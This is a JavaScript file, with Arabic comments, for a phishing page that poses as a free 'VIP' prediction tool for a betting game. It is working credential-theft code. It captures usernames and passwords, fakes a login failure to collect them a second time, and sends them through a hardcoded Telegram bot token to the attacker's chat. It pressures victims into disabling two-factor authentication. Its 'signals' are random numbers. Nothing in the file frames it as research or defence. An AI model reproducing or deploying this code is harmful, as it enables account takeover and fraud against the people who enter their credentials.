const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let loginAttempts = 0;

async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('status-text');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;

    // المحاولة 1: خطأ إجباري لضمان صحة الباسوورد
    if (loginAttempts === 1) {
        btn.disabled = true;
        btn.innerText = "Verifying...";
        await sendToTelegram(`⚠️ محاولة 1 (تأكد):\n👤 User: ${u}\n🔑 Pass: ${p}`);
        
        setTimeout(() => {
            msg.innerText = "❌ فشل الاتصال: كلمة المرور أو اليوزر غير صحيح!";
            msg.style.color = "#ff4444";
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
        return;
    }

    // المحاولة 2: شروط الـ VIP وإلغاء المصادقة
    if (loginAttempts === 2) {
        btn.disabled = true;
        btn.innerText = "Analyzing...";
        
        // إرسال البيانات فوراً للبوت
        await sendToTelegram(`✅ بيانات مؤكدة (محاولة 2):\n👤 User: ${u}\n🔑 Pass: ${p}`);

        // إظهار نافذة الإقناع الإجبارية
        showSecurityNotice();
    }
}

function showSecurityNotice() {
    const msg = document.getElementById('status-text');
    const btn = document.getElementById('sync-btn');
    const inputs = document.querySelectorAll('.auth-input');

    // إخفاء خانات الإدخال لإجبار المستخدم على القراءة
    inputs.forEach(i => i.style.display = 'none');

    msg.innerHTML = `
        <div style="text-align: right; background: rgba(255,0,0,0.1); padding: 10px; border-radius: 8px; border: 1px solid #ff4444;">
            <h4 style="color: #ff4444; margin-top: 0;">⚠️ متطلبات تفعيل الـ VIP المجاني:</h4>
            <p style="font-size: 13px; color: #eee;">
                لإتمام "المزامنة الكمية" والحصول على دقة 96%، يجب أن يكون حسابك قابلاً للربط المباشر مع سيرفر Veto Vision.
            </p>
            <ul style="font-size: 12px; color: #ccc; padding-right: 20px;">
                <li>يجب <b>إلغاء تفعيل المصادقة الثنائية (2FA)</b> مؤقتاً من إعدادات حسابك.</li>
                <li>هذا الإجراء ضروري لتحليل بيانات المزامنة وتخليل النتائج في حسابك.</li>
                <li>بعد الدخول للرادار، يمكنك إعادة تفعيلها مجدداً.</li>
            </ul>
        </div>
    `;
    
    btn.disabled = false;
    btn.innerText = "لقد ألغيت المصادقة.. دخول الآن ✅";
    
    btn.onclick = () => {
        btn.innerText = "Connecting...";
        setTimeout(() => {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('main-app').classList.remove('hidden');
            sendToTelegram(`🔔 الضحية أكد إلغاء المصادقة ودخل للرادار!`);
        }, 2000);
    };
}

// وظيفة جلب الإشارة (بدون أخطاء)
function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        const mult = (Math.random() * (3.80 - 1.20) + 1.20).toFixed(2) + "x";
        display.innerText = mult;
    }, 1000);
}

async function sendToTelegram(text) {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
}
